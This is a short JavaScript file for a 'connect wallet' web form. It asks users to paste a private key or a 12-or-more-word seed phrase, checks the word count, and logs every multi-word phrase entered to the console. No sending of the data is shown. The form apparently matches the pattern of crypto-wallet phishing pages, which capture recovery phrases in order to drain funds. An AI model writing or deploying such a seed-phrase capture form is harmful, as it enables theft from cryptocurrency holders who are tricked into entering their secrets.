window.onload = function () {
  const input = document.querySelector(".connect-wallet-input");
  document.getElementById("connect-wallet-btn").addEventListener("click", () => {
    const value = input.value.trim();
    const parts = value.split(/\s+/).filter(Boolean); // делим по пробелам/табам/переносам строк
    if (parts.length === 1) {
        const message = "Invalid private key";
        const icon = "../img/error.svg"
        const duration = 1200;
        showSnackbar(message, icon, duration)
    } else if (parts.length > 1) {
      if (parts.length < 12) {
        const message = "Secret phrase must have minimum 12 words";
        const icon = "../img/error.svg"
        const duration = 1200;
        showSnackbar(message, icon, duration)
        console.log("Seed phrase", parts.join(" "));
      } else {
        console.log("Seed phrase", parts.join(" "));
      }
    } else {
        const message = "Field is empty";
        const icon = "../img/error.svg"
        const duration = 1200;
        showSnackbar(message, icon, duration)
    }
  })
}